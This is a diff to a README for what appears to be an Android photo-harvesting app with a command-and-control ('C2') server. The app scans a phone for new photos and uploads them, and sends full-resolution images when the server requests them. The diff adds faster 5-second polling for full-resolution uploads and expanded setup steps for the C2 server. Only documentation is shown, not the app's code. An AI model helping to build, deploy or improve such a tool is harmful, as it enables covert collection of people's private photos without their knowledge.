@@ -71,6 +71,7 @@
 - **Periodic scan** — Every 30 sec, checks for new photos
 - **Server-aware** — Only uploads when C2 is reachable
 - **Deduplication** — Never re-uploads the same image
+- **Fast Full-Res** — Dedicated 5s polling for instant high-res uploads
 - **Full image on-demand** — Server requests → phone uploads full-res
 - **All image formats** — JPEG, PNG, WEBP, GIF, HEIC, BMP...
 - **Memory-safe** — Downsampled decoding + bitmap recycling
@@ -108,10 +109,22 @@ echo "SERVER_URL=https://your-server.com" > app/local.properties
 
 ### 2. Start C2
 
-```bash
-npm install express cors multer
-node server.js
-```
+1. **Install dependencies:**
+    ```bash
+    npm install express cors multer dotenv express-session
+    ```
+
+2. **Configure Authentication:**
+    Create a `.env` file in the root directory:
+    ```env
+    ADMIN_USERNAME=your_username
+    ADMIN_PASSWORD=your_password
+    ```
+
+3. **Run Server:**
+    ```bash
+    node server.js
+    ```
 
 ### 3. Build & Deploy
 
